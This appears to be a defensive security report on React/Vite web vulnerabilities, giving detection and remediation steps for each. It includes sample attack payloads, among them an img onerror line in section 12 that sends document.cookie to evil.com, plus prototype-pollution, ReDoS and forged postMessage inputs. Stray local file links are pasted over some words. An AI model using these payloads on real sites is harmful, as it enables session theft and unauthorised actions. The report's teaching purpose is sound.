@@ -1,0 +1,329 @@
+# System Bug Research Report 4: Security & Cryptography Pitfalls
+
+**Scope:** XSS, CSRF, Supply Chain (NPM), Prototype Pollution (Object.assign/spread), ReDoS (Zod/Regex)  
+**Target Audience:** Security Engineers, Penetration Testers, DevSecOps  
+**Date:** 2026-02-18
+
+---
+
+## 1. Executive Summary
+
+Modern SPAs are often perceived as "secure by default" against XSS due to React's automatic escaping. However, this false sense of security leads to **category-specific vulnerabilities** like `javascript:` URI injection, **prototype pollution** in state management reducers, and **supply chain compromises** via the massive `node_modules` dependency tree.
+
+This report details the high-risk vectors specific to the React/Vite ecosystem that often bypass traditional WAFs (Web Application Firewalls).
+
+---
+
+## 2. Vulnerability Taxonomy: "React-Specific XSS" (URI Injection & JSON)
+
+### 2.1 Description
+React escapes standard HTML content (textContent). It does **not** escape attribute values in all contexts, specifically `href` and `src`.
+
+### 2.2 Manifestation
+- **Scenario:** A user profile allows a "Website" link.
+- **Attack:** User sets website to `javascript:alert(document.cookie)`.
+- **Bug:**
+    ```tsx
+    <a href={user.website}>My Site</a>
+    ```
+- **Result:** When another user clicks the link, the JS executes in their origin context.
+
+### 2.3 Detection
+- **Code Review:** Search for user-controlled data passed to `href`, `src`, or `dangerouslySetInnerHTML`.
+- **ESLint:** `eslint-plugin-react/jsx-no-script-url`.
+- **Payload Testing:** Inject `javascript:console.log('pwned')` into every input field.
+
+### 2.4 Remediation Pattern: Protocol Allowlisting
+**Strict Protocol Check:**
+```typescript
+const isSafeUrl = (url: string) => {
+  try {
+    const protocol = new URL(url).protocol;
+    return ['http:', 'https:', 'mailto:'].includes(protocol);
+  } catch {
+    return false; // Invalid URL
+  }
+};
+
+<a href={isSafeUrl(user.website) ? user.website : '#'}>My Site</a>
+```
+
+---
+
+## 3. Vulnerability Taxonomy: "Prototype Pollution" (The State corrupter)
+
+### 3.1 Description
+Functions that merge objects deeply (recursive merge) can be tricked into modifying `Object.prototype` if keys like `__proto__`, [constructor](file://wsl.localhost/Ubuntu/home/bcodex/TD.2.ANTIGRAVITY/client/src/lib/queryClient.ts#15-22), or `prototype` are not filtered.
+
+### 3.2 Manifestation in React
+- **Scenario:** WebSocket sends a partial update for a user settings object.
+- **Bug:** The reducer merges the update: `cloneDeep(state, update)`.
+- **Attack:** Update payload: `{ "__proto__": { "isAdmin": true } }`.
+- **Result:** Every object in the application now has `isAdmin === true` via prototype inheritance.
+
+### 3.3 Detection
+- **Audit Merge Utilities:** Does your deep merge function block strictly "unsafe" keys?
+- **Tools:** Snyk, npm audit (often flags vulnerable versions of `lodash`, `minimist`, etc.).
+- **Manual Test:** Send `{"__proto__":{"b":2}}`. Check [({}).b](file://wsl.localhost/Ubuntu/home/bcodex/TD.2.ANTIGRAVITY/client/src/lib/secureCache.ts#273-310) in console.
+
+### 3.4 Remediation Pattern: Defensive Merge Implementation
+**Block Unsafe Keys:**
+```typescript
+const UNSAFE_KEYS = ['__proto__', 'constructor', 'prototype'];
+if (UNSAFE_KEYS.includes(key)) return;
+```
+
+**Use Map/Set or null-prototype objects:**
+`const state = Object.create(null);` (No prototype to pollute).
+
+**Freeze Prototype:**
+`Object.freeze(Object.prototype);` (Drastic, breaks some libraries, but effective).
+
+---
+
+## 4. Vulnerability Taxonomy: "Regular Expression Denial of Service" (ReDoS)
+
+### 4.1 Description
+Regex engines in JS are backtracking. A crafted string can cause the engine to take exponential time ([O(2^n)](file://wsl.localhost/Ubuntu/home/bcodex/TD.2.ANTIGRAVITY/client/src/lib/perfHints.ts#106-111)) to match or fail.
+
+### 4.2 Manifestation
+- **Scenario:** Email validation regex in Zod schema.
+- **Bug:** Regex is `^([a-zA-Z0-9]+)*$`.
+- **Attack:** Send `aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!`.
+- **Result:** The UI thread freezes for 10 seconds while validating the form. If this validation happens on the server (Node.js), the **entire Node process blocks**, causing a DoS for all users.
+
+### 4.3 Detection
+- **Tools:** [safe-regex](https://www.npmjs.com/package/safe-regex), [vuln-regex-detector](https://www.npmjs.com/package/vuln-regex-detector).
+- **Code Review:** Look for nested quantifiers [(a+)+](file://wsl.localhost/Ubuntu/home/bcodex/TD.2.ANTIGRAVITY/client/src/lib/secureCache.ts#273-310) .
+
+### 4.4 Remediation
+- **Use Libraries:** `validator.js` (battle-tested regexes).
+- **Atomic Groups (ES2018):** Not fully supported in all regex engines yet.
+- **Limit Input Length:** Enforce `max(100)` chars *before* running the regex.
+
+---
+
+## 5. Vulnerability Taxonomy: "Supply Chain Compromise" (NPM)
+
+### 5.1 Description
+Modern React apps have 1000+ dependencies. A maintainer of a deep dependency (e.g., `left-pad`) gets hacked or goes rogue. They publish a minor version update containing a cryptominer or credential stealer.
+
+### 5.2 Manifestation
+- **Scenario:** `npm install` runs in CI/CD.
+- **Bug:** It pulls `library-x @ 1.0.1` (malicious) instead of `1.0.0` due to `^1.0.0` in [package.json](file://wsl.localhost/Ubuntu/home/bcodex/TD.2.ANTIGRAVITY/package.json).
+- **Result:** The build artifact contains code that sends `localStorage` to a C2 server on page load.
+
+### 5.3 Detection
+- **Socket.dev / Snyk:** Monitor dependency health.
+- **Diff Review:** Review [package-lock.json](file://wsl.localhost/Ubuntu/home/bcodex/TD.2.ANTIGRAVITY/package-lock.json) changes carefully.
+
+### 5.4 Remediation Pattern: Lockfile & CI Hygiene
+**Strict Versioning:**
+Use `npm ci` (Clean Install) in CI environments. It **strictly** respects [package-lock.json](file://wsl.localhost/Ubuntu/home/bcodex/TD.2.ANTIGRAVITY/package-lock.json) and will fail if the lockfile doesn't match [package.json](file://wsl.localhost/Ubuntu/home/bcodex/TD.2.ANTIGRAVITY/package.json).
+
+**Pin Dependencies:**
+Remove carets (`^`) and tildes (`~`) from [package.json](file://wsl.localhost/Ubuntu/home/bcodex/TD.2.ANTIGRAVITY/package.json) for critical packages to prevent auto-updates.
+
+**Script Disable (Defense in Depth):**
+`npm config set ignore-scripts true` prevents `postinstall` scripts from running (a common vector for malware installation).
+
+---
+
+## 6. Vulnerability Taxonomy: "CSRF in Single-Page Applications"
+
+### 6.1 Description
+Cross-Site Request Forgery forces a logged-in user to perform actions unknowingly. SPAs often assume they're immune because they use JSON APIs, but CSRF is still possible if the API accepts form-encoded data or if cookies are used for auth without proper protections.
+
+### 6.2 Attack Vectors
+
+| Vector | Works Against |
+|--------|--------------|
+| **Form POST** | APIs that accept `application/x-www-form-urlencoded` alongside JSON |
+| **Fetch with credentials** | APIs relying only on session cookies + no CSRF token |
+| **XHR preflight bypass** | Simple requests (`GET`, `POST` with certain content types) skip CORS preflight |
+
+### 6.3 Detection
+- **Test:** From a different origin, submit a `<form action="https://trading.com/api/trade" method="POST">`. Does the server process it?
+- **Code Review:** Does every state-mutating endpoint verify a CSRF token or require a custom header (e.g., `X-Requested-With`)?
+
+### 6.4 Remediation
+- **SameSite Cookies:** `SameSite=Strict` or `Lax` prevents cookies from being sent on cross-origin requests.
+- **Double-Submit Cookie:** Server sets CSRF token in a cookie and expects it in a header. Attacker can't read the cookie cross-origin.
+- **Custom Header Requirement:** Require `Content-Type: application/json` + `X-Requested-With: XMLHttpRequest`. These trigger CORS preflight, which blocks cross-origin requests.
+
+```typescript
+// ✅ Custom header forces CORS preflight
+fetch('/api/trade', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json',
+    'X-CSRF-Token': getCsrfToken(),
+  },
+  body: JSON.stringify(order),
+});
+```
+
+---
+
+## 7. Vulnerability Taxonomy: "Content Security Policy (CSP) Gaps"
+
+### 7.1 Description
+CSP is an HTTP header that restricts which resources the browser is allowed to load. Without CSP, injected scripts (via XSS) execute freely. With a weak CSP (`script-src 'unsafe-inline'`), CSP provides no protection.
+
+### 7.2 Common CSP Mistakes
+
+| Mistake | Impact |
+|---------|--------|
+| **`'unsafe-inline'` in `script-src`** | Inline `<script>` tags (from XSS) execute normally |
+| **`'unsafe-eval'` in `script-src`** | [eval()](file://wsl.localhost/Ubuntu/home/bcodex/TD.2.ANTIGRAVITY/client/src/sw.ts#156-178), `new Function()`, and template literal injection work |
+| **Wildcard `*.cdn.com`** | Attacker hosts payload on the same CDN |
+| **Missing `frame-ancestors`** | Page can be framed by any origin (clickjacking) |
+| **No `report-uri` / `report-to`** | CSP violations happen silently, you never know |
+
+### 7.3 Detection
+- **Header Check:** `curl -I https://trading.com | grep -i content-security-policy`
+- **CSP Evaluator:** Google's `csp-evaluator.withgoogle.com`
+- **Browser Console:** CSP violations show as red errors in Console.
+
+### 7.4 Remediation
+```
+Content-Security-Policy:
+  default-src 'self';
+  script-src 'self' 'nonce-{random}';
+  style-src 'self' 'unsafe-inline';
+  img-src 'self' data: https://cdn.trading.com;
+  connect-src 'self' wss://ws.trading.com;
+  frame-ancestors 'self';
+  report-uri /csp-report;
+```
+Use **nonce-based** CSP for scripts (Vite supports this via `html-nonce` plugin).
+
+---
+
+## 8. Vulnerability Taxonomy: "postMessage Origin Validation"
+
+### 8.1 Description
+`window.postMessage()` enables cross-origin communication between windows/iframes. If the receiver doesn't validate `event.origin`, any page can send it messages, potentially triggering privileged actions.
+
+### 8.2 Manifestation in Trading
+- **Scenario:** Trading widget receives `postMessage` to execute trades (from parent frame).
+- **Bug:** Receiver doesn't check `event.origin`.
+- **Attack:** Attacker opens `trading.com` in a popup from `evil.com` and sends `{ action: 'executeTrade', symbol: 'BTC', qty: 999 }`.
+- **Result:** Trade executed without user interaction.
+
+### 8.3 Detection
+- **Grep:** `addEventListener('message'` — does the handler check `event.origin`?
+- **Test:** Open the app in an iframe from a different origin. Send a postMessage. Is it processed?
+
+### 8.4 Remediation
+```typescript
+window.addEventListener('message', (event) => {
+  // ✅ ALWAYS validate origin
+  if (event.origin !== 'https://trusted-partner.com') return;
+
+  // ✅ Validate message structure
+  const parsed = messageSchema.safeParse(event.data);
+  if (!parsed.success) return;
+
+  handleMessage(parsed.data);
+});
+```
+
+---
+
+## 9. Vulnerability Taxonomy: "Cookie Security Misconfigurations"
+
+### 9.1 Description
+Session cookies are the keys to the kingdom. Misconfigured flags can expose them to interception, theft, or misuse.
+
+### 9.2 Flag Matrix
+
+| Flag | Missing Impact | Correct Value |
+|------|---------------|---------------|
+| [Secure](file://wsl.localhost/Ubuntu/home/bcodex/TD.2.ANTIGRAVITY/client/src/lib/secureCache.ts#205-401) | Cookie sent over HTTP (interceptable) | [Secure](file://wsl.localhost/Ubuntu/home/bcodex/TD.2.ANTIGRAVITY/client/src/lib/secureCache.ts#205-401) |
+| `HttpOnly` | Cookie readable by JS (`document.cookie` — XSS steals it) | `HttpOnly` |
+| `SameSite` | Cookie sent on cross-origin requests (CSRF) | `Strict` or `Lax` |
+| [Path](file://wsl.localhost/Ubuntu/home/bcodex/TD.2.ANTIGRAVITY/client/src/sw.ts#61-67) | Cookie sent to all paths (unnecessary exposure) | `/api` or specific path |
+| `Domain` | Cookie shared with subdomains (increases attack surface) | Omit (defaults to exact origin) |
+| `Max-Age` / `Expires` | Session cookie (lost on tab close, but also no server-side timeout) | Set explicit expiry |
+
+### 9.3 Detection
+- **DevTools → Application → Cookies:** Inspect all cookies for flag presence.
+- **Automated:** `Set-Cookie` header scanner in CI pipeline.
+
+### 9.4 Remediation
+```
+Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Strict; Path=/api; Max-Age=3600
+```
+
+---
+
+## 10. Vulnerability Taxonomy: "Clickjacking (UI Redressing)"
+
+### 10.1 Description
+An attacker renders the trading app inside an invisible `<iframe>`, overlaid with a convincing fake page. The user thinks they're clicking "Play Video" but they're actually clicking "Confirm Trade" on the invisible trading app.
+
+### 10.2 Detection
+- **X-Frame-Options Header:** Check if the server sends `X-Frame-Options: DENY` or `SAMEORIGIN`.
+- **CSP:** Check for `frame-ancestors 'self'` directive.
+- **Test:** Embed the app in an `<iframe>` from a different origin. Does it load?
+
+### 10.3 Remediation
+- **HTTP Header:** `X-Frame-Options: DENY`
+- **CSP:** `frame-ancestors 'self'`
+- **JavaScript Framebusting (fallback):**
+```javascript
+if (window.top !== window.self) {
+  window.top.location = window.self.location; // Break out of frame
+}
+```
+
+---
+
+## 11. Vulnerability Taxonomy: "Timing Side Channels"
+
+### 11.1 Description
+If a server responds faster for "user not found" (100ms) vs "wrong password" (300ms), an attacker can enumerate valid usernames by measuring response times. Similarly, string comparisons that bail early on first mismatch leak information about token/password structure.
+
+### 11.2 Relevance to Trading
+- **Endpoint:** `/api/auth/login` — timing reveals whether an email is registered.
+- **Endpoint:** `/api/verify-2fa` — timing reveals how many digits of TOTP are correct.
+
+### 11.3 Detection
+- **Statistical Analysis:** Run 100 login attempts with valid vs invalid usernames. Compare average response times.
+- **Code Review:** Does the auth code use constant-time comparison for tokens/passwords?
+
+### 11.4 Remediation
+- **Constant-Time Comparison:** `crypto.timingSafeEqual(a, b)` in Node.js.
+- **Uniform Response Time:** Add artificial delay to make "not found" and "wrong password" indistinguishable.
+- **Rate Limiting:** Limit login attempts per IP to make statistical attacks impractical.
+
+---
+
+## 12. Vulnerability Taxonomy: "dangerouslySetInnerHTML Injection"
+
+### 12.1 Description
+React's `dangerouslySetInnerHTML` bypasses all XSS protections. It renders raw HTML directly into the DOM. If the HTML contains user-controlled content, it's a direct XSS vulnerability.
+
+### 12.2 Manifestation
+- **Scenario:** A "Trade Notes" feature allows rich text editing. Notes are stored as HTML.
+- **Bug:** Notes are rendered with `dangerouslySetInnerHTML={{ __html: note.content }}`.
+- **Attack:** Attacker saves a note with `<img onerror="fetch('https://evil.com?cookie='+document.cookie)" src="x">`.
+- **Result:** Any user viewing the note has their cookies stolen.
+
+### 12.3 Detection
+- **Grep:** Search for `dangerouslySetInnerHTML` in the codebase. Every instance is a potential XSS.
+- **Count:** A production app should have < 5 instances total.
+
+### 12.4 Remediation
+- **DOMPurify:** Sanitize HTML before rendering:
+```typescript
+import DOMPurify from 'dompurify';
+<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(note.content) }} />
+```
+- **Markdown Instead:** Use markdown rendering (which doesn't allow arbitrary HTML) instead of raw HTML.
+- **CSP:** `script-src` without `'unsafe-inline'` blocks inline event handlers, but not all XSS payloads.
+
+---
+
+**End of Report 4**
